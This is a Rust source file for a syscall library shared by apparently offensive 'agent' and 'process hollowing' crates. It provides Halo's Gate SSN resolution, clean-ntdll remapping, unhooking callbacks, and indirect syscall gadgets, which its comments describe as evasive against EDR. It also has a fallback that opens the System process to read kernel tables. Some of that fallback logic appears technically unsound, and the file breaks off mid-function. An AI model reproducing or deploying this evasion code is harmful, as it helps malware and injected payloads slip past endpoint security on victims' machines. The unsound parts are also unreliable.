//! Shared Windows NT direct-syscall infrastructure.
//!
//! Provides SSN (System Service Number) resolution with **dynamic validation**,
//! a clean-ntdll mapper, a `do_syscall` dispatcher, and a `syscall!` macro.
//! Both the `agent` and `hollowing` crates depend on this crate so that neither
//! has to carry its own duplicate copy of Halo's Gate / clean-mapping logic.
//!
//! Unlike the richer `agent::syscalls` module, this crate does **not** include
//! the optional `stack-spoof` feature.  Stack spoofing is intentionally kept
//! in the agent crate where it is feature-gated and can pull additional ntdll
//! gadget data.  The simpler indirect-syscall path used here is still fully
//! evasive against most IAT/SSDT-hook-based EDR strategies.
//!
//! # Dynamic SSN Validation
//!
//! Cached SSNs are validated before use via two complementary methods:
//!
//! 1. **Cross-reference**: The PE header `TimeDateStamp` of the loaded ntdll is
//!    compared with the clean mapping's timestamp.  If they differ (e.g. after
//!    a Windows Update that replaces ntdll), the entire cache is invalidated.
//!
//! 2. **Probe**: For critical syscalls, a test call with intentionally invalid
//!    parameters is made.  `STATUS_INVALID_HANDLE` means the SSN is correct;
//!    `STATUS_INVALID_SYSTEM_SERVICE` means the SSN is stale.
//!
//! If both validation methods fail, a **SSDT-based nuclear fallback** resolves
//! SSNs by reading the kernel's `KeServiceDescriptorTable` — the highest-
//! reliability method but requiring `SeDebugPrivilege`.
//!
//! # Initialisation
//!
//! Call [`init_syscall_infrastructure`] once (e.g. at process start or before
//! any hollowing operation) to map a clean copy of ntdll.dll and pre-populate
//! the SSN cache.  Subsequent calls are no-ops.  If initialisation fails the
//! crate gracefully falls back to bootstrap-mode SSN resolution (Halo's Gate
//! against the loaded, potentially hooked, ntdll).

#![cfg(windows)]

use anyhow::anyhow;
use std::collections::HashMap;
use std::sync::atomic::{AtomicBool, AtomicU32, Ordering};
use std::sync::{Mutex, OnceLock, RwLock};

// ─── Syscall target ────────────────────────────────────────────────────────

/// A resolved Windows NT syscall descriptor.
#[derive(Clone, Copy, Debug)]
pub struct SyscallTarget {
    /// System Service Number — passed in EAX before the `syscall` instruction.
    pub ssn: u32,
    /// Address of a valid `syscall; ret` (or `syscall`) gadget inside ntdll's
    /// `.text` section.  Used as the indirect-call target to avoid EDR
    /// detection of `syscall` instructions in agent/hollowing code pages.
    pub gadget_addr: usize,
}

// ─── Statics ───────────────────────────────────────────────────────────────

/// Base address of the clean-mapped ntdll.dll image (None = not yet mapped).
/// Uses RwLock<Option<usize>> instead of OnceLock so that
/// `invalidate_syscall_cache()` can reset it and force a re-map.
static CLEAN_NTDLL: RwLock<Option<usize>> = RwLock::new(None);

/// Per-call SSN cache: function name → (ssn, gadget_addr, timestamp_at_cache).
/// The third element is the `TimeDateStamp` from the PE header of the clean
/// ntdll at the time the entry was cached — used for cross-reference validation.
static SYSCALL_CACHE: OnceLock<Mutex<HashMap<String, (u32, usize, u32)>>> = OnceLock::new();

/// Cached Windows build number (e.g. 19041, 22631).  Read from
/// `KUSER_SHARED_DATA` or `RtlGetVersion`.  0 = not yet queried.
static BUILD_NUMBER: AtomicU32 = AtomicU32::new(0);

/// Cached `TimeDateStamp` from the PE header of the clean-mapped ntdll.
/// Used for cross-reference validation against the loaded ntdll.
static CACHED_TIMESTAMP: AtomicU32 = AtomicU32::new(0);

/// Whether the cache has been invalidated and needs re-mapping on next access.
static CACHE_DIRTY: AtomicBool = AtomicBool::new(false);

/// NTSTATUS codes used for probe validation.
const STATUS_INVALID_HANDLE: i32 = 0xC0000008_u32 as i32;
const STATUS_INVALID_SYSTEM_SERVICE: i32 = 0xC000001C_u32 as i32;

/// `SystemModuleInformation` class for `NtQuerySystemInformation`.
const SYSTEM_MODULE_INFORMATION: u32 = 11;

/// `KUSER_SHARED_DATA` is always mapped at `0x7FFE0000` on modern Windows.
const KUSER_SHARED_DATA: usize = 0x7FFE0000;
/// Offset of `NtBuildNumber` in KUSER_SHARED_DATA.
const KUSD_OFFSET_BUILD: usize = 0x0260;

/// Optional callback that gets invoked when Halo's Gate fails to infer an SSN.
/// The agent's `ntdll_unhook` module registers this to perform a full ntdll
/// unhook before retrying.  The callback returns `true` if unhooking succeeded
/// (caller should retry SSN resolution) or `false` if it failed.
type UnhookCallback = fn() -> bool;
static UNHOOK_CALLBACK: OnceLock<UnhookCallback> = OnceLock::new();

/// Register a callback to be invoked when Halo's Gate fails (all adjacent
/// syscall stubs are hooked).  The callback should perform ntdll unhooking
/// and return `true` if successful, `false` otherwise.
///
/// This is the integration point between `nt_syscall` and the agent's
/// `ntdll_unhook` module.  Call once during agent initialisation:
///
/// ```rust,ignore
/// nt_syscall::set_halo_gate_fallback(ntdll_unhook::halo_gate_fallback);
/// ```
pub fn set_halo_gate_fallback(callback: UnhookCallback) {
    let _ = UNHOOK_CALLBACK.set(callback);
}

/// Invalidate the SSN cache **and** reset the clean ntdll mapping, forcing
/// a complete re-initialisation on next access.
///
/// This is the primary integration point for `ntdll_unhook`: after the .text
/// section of ntdll is overwritten with a clean copy, the cached mapping is
/// stale and must be discarded so the next `get_syscall_id` call re-maps from
/// the now-fresh on-disk ntdll.
pub fn invalidate_syscall_cache() {
    CACHE_DIRTY.store(true, Ordering::Release);
    if let Some(cache) = SYSCALL_CACHE.get() {
        cache.lock().unwrap().clear();
    }
    CACHED_TIMESTAMP.store(0, Ordering::Release);
    // Reset the clean ntdll mapping so get_syscall_id / init_syscall_infrastructure
    // will re-map from disk on next access.
    if let Ok(mut guard) = CLEAN_NTDLL.write() {
        *guard = None;
    }
    log::debug!("nt_syscall: cache invalidated — full re-map on next access");
}

/// Backwards-compatible alias for [`invalidate_syscall_cache`].
pub fn invalidate_ssn_cache() {
    invalidate_syscall_cache();
}

/// Return the current Windows build number (e.g. 19041, 22631).
///
/// Reads from `KUSER_SHARED_DATA` which is always mapped at `0x7FFE0000`.
/// The value is cached after the first read.
pub fn get_build_number() -> u32 {
    let cached = BUILD_NUMBER.load(Ordering::Acquire);
    if cached != 0 {
        return cached;
    }

    // Read from KUSER_SHARED_DATA.  This memory is always readable.
    let build = unsafe {
        let ptr = (KUSER_SHARED_DATA + KUSD_OFFSET_BUILD) as *const u32;
        // The build number in KUSER_SHARED_DATA has the architecture bits
        // in the high nibble (e.g. 0xF00019041 for x64).  Mask to get
        // just the build number.
        let raw = ptr.read_volatile();
        raw & 0x0000_FFFF
    };

    BUILD_NUMBER.store(build, Ordering::Release);
    log::debug!("nt_syscall: Windows build number = {}", build);
    build
}

/// Validate the current SSN cache.  Returns the number of validated entries
/// on success, or an error if validation failed and re-mapping is needed.
///
/// Two validation methods are applied:
///
/// 1. **Cross-reference**: Compare the PE `TimeDateStamp` of the loaded ntdll
///    with the cached timestamp.  If they differ, the cache is stale.
///
/// 2. **Probe**: For 4 critical syscalls, make a test call with an invalid
///    handle.  `STATUS_INVALID_HANDLE` → SSN is correct;
///    `STATUS_INVALID_SYSTEM_SERVICE` → SSN is stale.
pub fn validate_cache() -> anyhow::Result<usize> {
    // If cache was explicitly invalidated, force re-map.
    if CACHE_DIRTY.load(Ordering::Acquire) {
        return Err(anyhow!("nt_syscall: cache dirty flag set — needs re-map"));
    }

    // ── Method 1: Cross-reference via PE timestamp ────────────────────────
    let cached_ts = CACHED_TIMESTAMP.load(Ordering::Acquire);
    if cached_ts != 0 {
        let loaded_ts = unsafe { read_ntdll_timestamp() };
        if loaded_ts != 0 && loaded_ts != cached_ts {
            log::warn!(
                "nt_syscall: timestamp mismatch — loaded={:#010x} cached={:#010x}; invalidating",
                loaded_ts,
                cached_ts
            );
            invalidate_syscall_cache();
            return Err(anyhow!(
                "nt_syscall: ntdll timestamp changed — cache invalidated"
            ));
        }
    }

    // ── Method 2: Probe critical syscalls ──────────────────────────────────
    let cache = SYSCALL_CACHE.get_or_init(|| Mutex::new(HashMap::new()));
    let cache_lock = cache.lock().unwrap();
    let mut validated = 0;
    let mut any_stale = false;

    for name in CRITICAL_PROBE_SYSCALLS {
        if let Some(&(ssn, gadget, _ts)) = cache_lock.get(*name) {
            match probe_ssn(ssn, gadget) {
                ProbeResult::Valid => validated += 1,
                ProbeResult::Stale => {
                    log::warn!("nt_syscall: probe detected stale SSN for {}", name);
                    any_stale = true;
                }
                ProbeResult::Unknown => {
                    // Can't determine — trust the cache.
                    validated += 1;
                }
            }
        }
    }

    // Also count non-critical entries that weren't probed but are present.
    validated += cache_lock
        .keys()
        .filter(|k| !CRITICAL_PROBE_SYSCALLS.contains(&k.as_str()))
        .count();

    if any_stale {
        drop(cache_lock);
        invalidate_syscall_cache();
        return Err(anyhow!(
            "nt_syscall: stale SSNs detected by probe — cache invalidated"
        ));
    }

    // Validate against build-number range table.
    let build = get_build_number();
    if build != 0 {
        for (name, &(ssn, _gadget, _ts)) in cache_lock.iter() {
            if let Some((lo, hi)) = expected_ssn_range(name, build) {
                if ssn < lo || ssn > hi {
                    log::warn!(
                        "nt_syscall: {} SSN={} outside expected range [{},{}] for build {}; possible corruption",
                        name, ssn, lo, hi, build
                    );
                    // Don't invalidate on range mismatch alone — it could be
                    // a newer build we don't have in the table.  Just log.
                }
            }
        }
    }

    log::debug!("nt_syscall: cache validated — {} entries OK", validated);
    Ok(validated)
}

// ── Probe validation internals ─────────────────────────────────────────────

/// Syscalls that get probe-validated (most critical for agent operations).
const CRITICAL_PROBE_SYSCALLS: &[&str] = &[
    "NtAllocateVirtualMemory",
    "NtProtectVirtualMemory",
    "NtWriteVirtualMemory",
    "NtCreateThreadEx",
];

/// Result of an SSN probe call.
enum ProbeResult {
    /// SSN is confirmed valid (got `STATUS_INVALID_HANDLE`).
    Valid,
    /// SSN is stale (got `STATUS_INVALID_SYSTEM_SERVICE`).
    Stale,
    /// Indeterminate result.
    Unknown,
}

/// Probe an SSN by calling it with a NULL handle.
///
/// Most `Nt*` syscalls validate the handle parameter early.  If the SSN is
/// correct, the kernel returns `STATUS_INVALID_HANDLE`.  If the SSN is wrong,
/// the kernel returns `STATUS_INVALID_SYSTEM_SERVICE`.
fn probe_ssn(ssn: u32, gadget_addr: usize) -> ProbeResult {
    let status = unsafe {
        do_syscall(
            ssn,
            gadget_addr,
            &[0u64, 0, 0, 0, 0, 0], // NULL handle + zeroed args
        )
    };

    if status == STATUS_INVALID_HANDLE {
        ProbeResult::Valid
    } else if status == STATUS_INVALID_SYSTEM_SERVICE {
        ProbeResult::Stale
    } else {
        // Other status codes (e.g. STATUS_ACCESS_VIOLATION) are indeterminate.
        ProbeResult::Unknown
    }
}

/// Read the `TimeDateStamp` from the PE header of the loaded ntdll.
/// Returns 0 if the header cannot be parsed.
unsafe fn read_ntdll_timestamp() -> u32 {
    let base = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
        Some(b) => b,
        None => return 0,
    };
    read_pe_timestamp(base)
}

/// Read the `TimeDateStamp` from the PE header at `base`.
/// Returns 0 if the header cannot be parsed.
unsafe fn read_pe_timestamp(base: usize) -> u32 {
    let dos = &*(base as *const winapi::um::winnt::IMAGE_DOS_HEADER);
    if dos.e_magic != 0x5A4D {
        return 0;
    }
    let nt = &*((base + dos.e_lfanew as usize) as *const winapi::um::winnt::IMAGE_NT_HEADERS64);
    nt.FileHeader.TimeDateStamp
}

// ── Versioned SSN range table ─────────────────────────────────────────────
//
// Expected SSN ranges for the most critical syscalls across Windows versions.
// SSNs are assigned monotonically in the order Nt* exports appear in the
// sorted VA table, so the ranges are relatively stable.  Wildly out-of-range
// SSNs suggest corruption or a very new Windows build.
//
// Format: (min_ssn, max_ssn) across known builds.
// Sources: reverse-engineered from ntdll exports on Windows 10 1903–22H2 and
// Windows 11 21H2–24H2.

/// Return the expected SSN range for `func_name` on the given `build`, or
/// `None` if we don't have data for that function/build combination.
fn expected_ssn_range(func_name: &str, _build: u32) -> Option<(u32, u32)> {
    // These ranges are deliberately wide to accommodate minor build-to-build
    // variation.  The SSN space for Nt* functions on modern Windows spans
    // roughly 0x000–0x300.
    let ranges: &[(&str, u32, u32)] = &[
        ("NtAllocateVirtualMemory", 0x0010, 0x0028),
        ("NtProtectVirtualMemory", 0x0030, 0x0058),
        ("NtWriteVirtualMemory", 0x0028, 0x0040),
        ("NtReadVirtualMemory", 0x0028, 0x0042),
        ("NtCreateThreadEx", 0x0038, 0x0060),
        ("NtOpenProcess", 0x0020, 0x0038),
        ("NtOpenThread", 0x0020, 0x0036),
        ("NtClose", 0x0002, 0x0010),
        ("NtQueryVirtualMemory", 0x0018, 0x0030),
        ("NtQuerySystemInformation", 0x0028, 0x0044),
        ("NtMapViewOfSection", 0x0018, 0x0028),
        ("NtUnmapViewOfSection", 0x0018, 0x002A),
        ("NtCreateSection", 0x0038, 0x0052),
        ("NtOpenFile", 0x0020, 0x0038),
        ("NtReadFile", 0x0002, 0x000C),
        ("NtSetInformationProcess", 0x0028, 0x0040),
        ("NtFreeVirtualMemory", 0x0010, 0x0028),
        ("NtQueueApcThread", 0x0038, 0x0056),
        ("NtSetContextThread", 0x0038, 0x0056),
        ("NtGetContextThread", 0x0038, 0x0056),
    ];

    ranges.iter().find_map(|&(name, lo, hi)| {
        if name == func_name {
            Some((lo, hi))
        } else {
            None
        }
    })
}

// ── SSDT-based nuclear fallback ────────────────────────────────────────────
//
// If the clean ntdll mapping fails AND Halo's Gate fails (all adjacent stubs
// hooked), resolve SSNs by reading the kernel's Service Descriptor Table.
// This is the highest-reliability fallback but requires SeDebugPrivilege.
//
// Algorithm:
// 1. NtQuerySystemInformation(SystemModuleInformation) → kernel base address
// 2. Read kernel PE export table to find KiSystemServiceStart or similar
// 3. Parse the SSDT to map syscall numbers → kernel function addresses
// 4. Match the target function's kernel address to derive its SSN
//
// NOTE: This is intentionally conservative.  Reading kernel memory requires
// elevated privileges and creates detectable NtReadVirtualMemory calls to
// the System process.  It should only activate as a last resort.

/// Resolve an SSN via the SSDT.  Returns `None` if any step fails.
///
/// # Safety
///
/// Must have `SeDebugPrivilege` enabled.
unsafe fn resolve_via_ssdt(func_name: &str) -> Option<SyscallTarget> {
    log::debug!("nt_syscall: attempting SSDT resolution for {}", func_name);

    // Step 1: Get kernel base address via SystemModuleInformation.
    let kernel_base = query_kernel_base()?;
    log::debug!("nt_syscall: SSDT kernel base = {:#x}", kernel_base);

    // Step 2: Get a System process handle for reading kernel memory.
    // We need NtOpenProcess with SYSTEM process PID (4).
    let sys_open = get_bootstrap_ssn("NtOpenProcess")?;
    let sys_read = get_bootstrap_ssn("NtReadVirtualMemory")?;
    let sys_close = get_bootstrap_ssn("NtClose").unwrap_or(SyscallTarget {
        ssn: 0,
        gadget_addr: 0,
    });

    let mut h_system: *mut winapi::ctypes::c_void = std::ptr::null_mut();
    let pid: u32 = 4; // System process

    // Minimal OBJECT_ATTRIBUTES.
    let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
    obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;

    // CLIENT_ID for System process.
    #[repr(C)]
    struct ClientId {
        unique_process: *mut std::ffi::c_void,
        unique_thread: *mut std::ffi::c_void,
    }
    let mut client_id = ClientId {
        unique_process: pid as *mut _,
        unique_thread: std::ptr::null_mut(),
    };

    let status = do_syscall(
        sys_open.ssn,
        sys_open.gadget_addr,
        &[
            &mut h_system as *mut _ as u64,
            0x001F0003u64, // PROCESS_ALL_ACCESS (simplified)
            &mut obj_attr as *mut _ as u64,
            &mut client_id as *mut _ as u64,
        ],
    );

    if status < 0 || h_system.is_null() {
        log::warn!(
            "nt_syscall: SSDT — cannot open System process (NTSTATUS {:#010x})",
            status as u32
        );
        return None;
    }

    // RAII guard to ensure the System handle is always closed.
    struct SystemHandleGuard {
        handle: *mut winapi::ctypes::c_void,
        close: SyscallTarget,
    }
    impl Drop for SystemHandleGuard {
        fn drop(&mut self) {
            if !self.handle.is_null() && self.close.ssn != 0 {
                unsafe {
                    do_syscall(
                        self.close.ssn,
                        self.close.gadget_addr,
                        &[self.handle as u64],
                    );
                }
            }
        }
    }
    let _guard = SystemHandleGuard {
        handle: h_system,
        close: sys_close,
    };

    // Step 3: Read the kernel export table to find KeServiceDescriptorTable.
    //
    // On x64 Windows, the SSDT is accessed via the exported symbol
    // `KeServiceDescriptorTable`.  Each entry in the SSDT is a
    // `SYSTEM_SERVICE_TABLE` with the layout:
    //   PVOID   ServiceTableBase     — array of LONG offsets
    //   PVOID   ServiceCounterTable  — (unused on free builds)
    //   ULONG   NumberOfServices
    //   PVOID   ArgumentTable
    //
    // Each entry in ServiceTableBase is a 32-bit signed offset from the
    // table base: actual_address = ServiceTableBase + (offset >>> 4).
    // The index into this table IS the SSN.

    // Find the kernel export for the target Nt* function's address so we
    // can match it against SSDT entries.
    let target_export_rva = resolve_kernel_export_rva(kernel_base, func_name, h_system, sys_read)?;

    // Step 4: Locate KeServiceDescriptorTable in the kernel export table.
    let ssdt_rva =
        resolve_kernel_export_rva(kernel_base, "KeServiceDescriptorTable", h_system, sys_read)?;

    // Step 5: Read the SYSTEM_SERVICE_TABLE (first 16 bytes at SSDT RVA).
    // struct SYSTEM_SERVICE_TABLE {
    //     PVOID ServiceTableBase;       // +0x00
    //     PVOID ServiceCounterTable;    // +0x08
    //     ULONG NumberOfServices;       // +0x10
    //     PVOID ArgumentTable;          // +0x14
    // }
    let ssdt_addr = kernel_base + ssdt_rva;
    let mut sst_buf = [0u8; 24]; // Read enough for all 4 fields
    let mut bytes_read: usize = 0;
    let read_status = do_syscall(
        sys_read.ssn,
        sys_read.gadget_addr,
        &[
            h_system as u64,                  // ProcessHandle
            ssdt_addr as u64,                 // BaseAddress
            sst_buf.as_mut_ptr() as u64,      // Buffer
            sst_buf.len() as u64,             // NumberOfBytesToRead
            &mut bytes_read as *mut _ as u64, // NumberOfBytesRead
        ],
    );
    if read_status < 0 || bytes_read < 24 {
        log::warn!(
            "nt_syscall: SSDT — failed to read SYSTEM_SERVICE_TABLE (NTSTATUS {:#010x}, read {} bytes)",
            read_status as u32, bytes_read
        );
        return None;
    }

    let service_table_base = usize::from_le_bytes(sst_buf[0..8].try_into().unwrap());
    let number_of_services = u32::from_le_bytes(sst_buf[16..20].try_into().unwrap());

    if service_table_base == 0 || number_of_services == 0 || number_of_services > 0x1000 {
        log::warn!(
            "nt_syscall: SSDT — invalid ServiceTableBase={:#x} or NumberOfServices={}",
            service_table_base,
            number_of_services
        );
        return None;
    }

    // Step 6: Read the SSDT offset table (array of LONG offsets).
    let table_size = number_of_services as usize * 4;
    let mut offset_table = vec![0u8; table_size];
    let mut bytes_read = 0usize;
    let read_status = do_syscall(
        sys_read.ssn,
        sys_read.gadget_addr,
        &[
            h_system as u64,                  // ProcessHandle
            service_table_base as u64,        // BaseAddress
            offset_table.as_mut_ptr() as u64, // Buffer
            table_size as u64,                // NumberOfBytesToRead
            &mut bytes_read as *mut _ as u64, // NumberOfBytesRead
        ],
    );
    if read_status < 0 || bytes_read != table_size {
        log::warn!(
            "nt_syscall: SSDT — failed to read offset table (NTSTATUS {:#010x}, wanted {} got {} bytes)",
            read_status as u32, table_size, bytes_read
        );
        return None;
    }

    // Step 7: Walk the offset table, compute each service's kernel address,
    // and find the index whose address matches the target export.
    let target_addr = kernel_base + target_export_rva;
    for i in 0..number_of_services as usize {
        let off_bytes = &offset_table[i * 4..i * 4 + 4];
        let offset = i32::from_le_bytes(off_bytes.try_into().unwrap());
        // On x64 Windows: service_addr = ServiceTableBase + (offset >>> 4)
        let service_addr = service_table_base.wrapping_add((offset as usize) >> 4);
        if service_addr == target_addr {
            let gadget = get_bootstrap_ssn("NtClose")
                .map(|t| t.gadget_addr)
                .unwrap_or(0);
            if gadget != 0 {
                log::info!(
                    "nt_syscall: SSDT resolved {} → SSN={} (verified via kernel SSDT)",
                    func_name,
                    i
                );
                return Some(SyscallTarget {
                    ssn: i as u32,
                    gadget_addr: gadget,
                });
            }
        }
    }

    log::warn!(
        "nt_syscall: SSDT — target {} not found in {} SSDT entries",
        func_name,
        number_of_services
    );
    None
}

/// Resolve a kernel export's RVA by parsing the kernel PE export table
/// through `NtReadVirtualMemory` on the System process handle.
///
/// Returns the RVA (relative to `kernel_base`) of the named export.
unsafe fn resolve_kernel_export_rva(
    kernel_base: usize,
    export_name: &str,
    h_system: *mut winapi::ctypes::c_void,
    sys_read: SyscallTarget,
) -> Option<usize> {
    // Read the DOS header.
    let mut dos_buf = [0u8; std::mem::size_of::<winapi::um::winnt::IMAGE_DOS_HEADER>()];
    let mut bytes_read: usize = 0;
    let status = do_syscall(
        sys_read.ssn,
        sys_read.gadget_addr,
        &[
            h_system as u64,                  // ProcessHandle
            kernel_base as u64,               // BaseAddress
            dos_buf.as_mut_ptr() as u64,      // Buffer
            dos_buf.len() as u64,             // NumberOfBytesToRead
            &mut bytes_read as *mut _ as u64, // NumberOfBytesRead
        ],
    );
    if status < 0 || bytes_read < dos_buf.len() {
        return None;
    }
    let e_magic = u16::from_le_bytes(dos_buf[0..2].try_into().unwrap());
    if e_magic != 0x5A4D {
        return None;
    }
    let e_lfanew = i32::from_le_bytes(dos_buf[60..64].try_into().unwrap()) as usize;

    // Read the NT headers signature + FILE_HEADER.
    let nt_offset = e_lfanew;
    let mut nt_buf = [0u8; 4 + 20]; // Signature + IMAGE_FILE_HEADER
    bytes_read = 0;
    let status = do_syscall(
        sys_read.ssn,
        sys_read.gadget_addr,
        &[
            h_system as u64,                  // ProcessHandle
            (kernel_base + nt_offset) as u64, // BaseAddress
            nt_buf.as_mut_ptr() as u64,       // Buffer
            nt_buf.len() as u64,              // NumberOfBytesToRead
            &mut bytes_read as *mut _ as u64, // NumberOfBytesRead
        ],
    );
    if status < 0 || bytes_read < nt_buf.len() {
        return None;
    }
    let sig = u32::from_le_bytes(nt_buf[0..4].try_into().unwrap());
    if sig != 0x4550 {
        return None;
    } // "PE\0\0"
    let size_of_optional_header = u16::from_le_bytes(nt_buf[20..22].try_into().unwrap()) as usize;

    // Read the optional header to get the export directory RVA.
    let opt_offset = nt_offset + 4 + 20;
    let mut opt_buf = vec![0u8; size_of_optional_header];
    bytes_read = 0;
    let status = do_syscall(
        sys_read.ssn,
        sys_read.gadget_addr,
        &[
            h_system as u64,                   // ProcessHandle
            (kernel_base + opt_offset) as u64, // BaseAddress
            opt_buf.as_mut_ptr() as u64,       // Buffer
            opt_buf.len() as u64,              // NumberOfBytesToRead
            &mut bytes_read as *mut _ as u64,  // NumberOfBytesRead
        ],
    );
    if status < 0 || bytes_read < size_of_optional_header {
        return None;
    }
    // Magic at offset 0 of optional header.
    let magic = u16::from_le_bytes(opt_buf[0..2].try_into().unwrap());
    // DataDirectory[0] (export table) is at offset 112 for PE32+,
    // offset 96 for PE32.
    let dd_export_off = if magic == 0x020B { 112 } else { 96 };
    if dd_export_off + 8 > opt_buf.len() {
        return None;
    }
    let export_rva = u32::from_le_bytes(
        opt_buf[dd_export_off..dd_export_off + 4]
            .try_into()
            .unwrap(),
    ) as usize;
    let export_size = u32::from_le_bytes(
        opt_buf[dd_export_off + 4..dd_export_off + 8]
            .try_into()
            .unwrap(),
    ) as usize;
    if export_rva == 0 || export_size == 0 {
        return None;
    }

    // Read the IMAGE_EXPORT_DIRECTORY (40 bytes).
    let mut export_dir_buf = [0u8; 40];
    bytes_read = 0;
    let status = do_syscall(
        sys_read.ssn,
        sys_read.gadget_addr,
        &[
            h_system as u64,                    // ProcessHandle
            (kernel_base + export_rva) as u64,  // BaseAddress
            export_dir_buf.as_mut_ptr() as u64, // Buffer
            40u64,                              // NumberOfBytesToRead
            &mut bytes_read as *mut _ as u64,   // NumberOfBytesRead
        ],
    );
    if status < 0 || bytes_read < 40 {
        return None;
    }

    let num_names = u32::from_le_bytes(export_dir_buf[24..28].try_into().unwrap()) as usize;
    let addr_of_names = u32::from_le_bytes(export_dir_buf[32..36].try_into().unwrap()) as usize;
    let addr_of_name_ordinals =
        u32::from_le_bytes(export_dir_buf[36..40].try_into().unwrap()) as usize;
    let addr_of_functions = u32::from_le_bytes(export_dir_buf[28..32].try_into().unwrap()) as usize;

    // Read the name pointer table.
    let name_table_size = num_names * 4;
    let mut name_table = vec![0u8; name_table_size];
    bytes_read = 0;
    let status = do_syscall(
        sys_read.ssn,
        sys_read.gadget_addr,
        &[
            h_system as u64,                      // ProcessHandle
            (kernel_base + addr_of_names) as u64, // BaseAddress
            name_table.as_mut_ptr() as u64,       // Buffer
            name_table_size as u64,               // NumberOfBytesToRead
            &mut bytes_read as *mut _ as u64,     // NumberOfBytesRead
        ],
    );
    if status < 0 || bytes_read < name_table_size {
        return None;
    }

    // Search for the export name using binary search (kernel exports are sorted).
    let name_bytes = export_name.as_bytes();
    let mut lo: usize = 0;
    let mut hi: usize = num_names;
    let mut found_idx: Option<usize> = None;

    while lo < hi {
        let mid = (lo + hi) / 2;
        let name_rva =
            u32::from_le_bytes(name_table[mid * 4..mid * 4 + 4].try_into().unwrap()) as usize;

        // Read up to 128 bytes of the name for comparison.
        let mut name_buf = [0u8; 128];
        bytes_read = 0;
        let _ = do_syscall(
            sys_read.ssn,
            sys_read.gadget_addr,
            &[
                h_system as u64,                  // ProcessHandle
                (kernel_base + name_rva) as u64,  // BaseAddress
                name_buf.as_mut_ptr() as u64,     // Buffer
                128u64,                           // NumberOfBytesToRead
                &mut bytes_read as *mut _ as u64, // NumberOfBytesRead
            ],
        );

        // Compare as C strings.
        let remote_name = &name_buf[..bytes_read.min(128)];
        let cmp = compare_export_name(remote_name, name_bytes);
        if cmp == 0 {
            found_idx = Some(mid);
            break;
        } else if cmp < 0 {
            lo = mid + 1;
        } else {
            hi = mid;
        }
    }

    let idx = found_idx?;

    // Read the ordinal for this name.
    let mut ordinal_buf = [0u8; 2];
    bytes_read = 0;
    let status = do_syscall(
        sys_read.ssn,
        sys_read.gadget_addr,
        &[
            h_system as u64,                                        // ProcessHandle
            (kernel_base + addr_of_name_ordinals + idx * 2) as u64, // BaseAddress
            ordinal_buf.as_mut_ptr() as u64,                        // Buffer
            2u64,                                                   // NumberOfBytesToRead
            &mut bytes_read as *mut _ as u64,                       // NumberOfBytesRead
        ],
    );
    if status < 0 || bytes_read < 2 {
        return None;
    }
    let ordinal = u16::from_le_bytes(ordinal_buf) as usize;

    // Read the function RVA.
    let mut func_buf = [0u8; 4];
    bytes_read = 0;
    let status = do_syscall(
        sys_read.ssn,
        sys_read.gadget_addr,
        &[
            h_system as u64,                                        // ProcessHandle
            (kernel_base + addr_of_functions + ordinal * 4) as u64, // BaseAddress
            func_buf.as_mut_ptr() as u64,                           // Buffer
            4u64,                                                   // NumberOfBytesToRead
            &mut bytes_read as *mut _ as u64,                       // NumberOfBytesRead
        ],
    );
    if status < 0 || bytes_read < 4 {
        return None;
    }
    let func_rva = u32::from_le_bytes(func_buf) as usize;

    // Check for forwarded export (RVA within export directory).
    if func_rva >= export_rva && func_rva < export_rva + export_size {
        return None;
    }

    Some(func_rva)
}

/// Compare a remote C string (read from kernel memory) with a target name.
/// Returns < 0, 0, or > 0 like strcmp.
fn compare_export_name(remote: &[u8], target: &[u8]) -> i32 {
    for i in 0..target.len() {
        if i >= remote.len() {
            return 1; // remote is shorter / has NUL before target ends
        }
        if remote[i] == 0 {
            return 1;
        }
        match remote[i].cmp(&target[i]) {
            std::cmp::Ordering::Less => return -1,
            std::cmp::Ordering::Greater => return 1,
            std::cmp::Ordering::Equal => {}
        }
    }
    // Target exhausted — check if remote also ends here (or has more chars).
    if target.len() < remote.len() && remote[target.len()] != 0 {
        -1 // remote is longer
    } else {
        0
    }
}

/// Query the kernel base address via `NtQuerySystemInformation(SystemModuleInformation)`.
unsafe fn query_kernel_base() -> Option<usize> {
    let sys_query = get_bootstrap_ssn("NtQuerySystemInformation")?;

    // First call: get required buffer size.
    let mut return_length: u32 = 0;
    let _status = do_syscall(
        sys_query.ssn,
        sys_query.gadget_addr,
        &[
            SYSTEM_MODULE_INFORMATION as u64,    // SystemInformationClass
            0u64,                                // SystemInformation (NULL)
            0u64,                                // SystemInformationLength
            &mut return_length as *mut _ as u64, // ReturnLength
        ],
    );
    // Expect STATUS_INFO_LENGTH_MISMATCH (0xC0000004).
    if return_length == 0 {
        return None;
    }

    // Allocate buffer and make second call.
    let mut buf: Vec<u8> = vec![0u8; return_length as usize];
    let status = do_syscall(
        sys_query.ssn,
        sys_query.gadget_addr,
        &[
            SYSTEM_MODULE_INFORMATION as u64,
            buf.as_mut_ptr() as u64,
            return_length as u64,
            &mut return_length as *mut _ as u64,
        ],
    );
    if status < 0 {
        return None;
    }

    // Parse RTL_PROCESS_MODULES.  First DWORD is NumberOfModules.
    if buf.len() < 4 {
        return None;
    }
    let num_modules = u32::from_le_bytes(buf[0..4].try_into().ok()?) as usize;
    if num_modules == 0 {
        return None;
    }

    // RTL_PROCESS_MODULE_INFORMATION — matches the kernel's definition on x86_64.
    // The `Section` field is an expanded IMAGE_INFO structure (16 bytes on x64),
    // followed by the standard fields.  Using a repr(C) struct ensures the layout
    // matches the ABI and lets the compiler compute the correct size, eliminating
    // manual byte-counting errors.
    #[cfg(target_arch = "x86_64")]
    #[repr(C)]
    #[allow(non_camel_case_types)]
    struct RtlProcessModuleInformation {
        section: [u64; 2],         // +0x00  IMAGE_INFO (16 bytes on x64)
        mapped_base: u64,          // +0x10
        image_base: u64,           // +0x18  — what we want
        image_size: u32,           // +0x20
        flags: u32,                // +0x24
        load_order_index: u16,     // +0x28
        init_order_index: u16,     // +0x2A
        load_count: u16,           // +0x2C
        offset_to_file_name: u16,  // +0x2E
        full_path_name: [u8; 256], // +0x30
    }

    #[cfg(target_arch = "x86_64")]
    const MODULE_INFO_SIZE: usize = std::mem::size_of::<RtlProcessModuleInformation>();

    // Fallback for non-x86_64 targets (e.g. aarch64) where the struct layout
    // may differ — use the known size for that architecture.
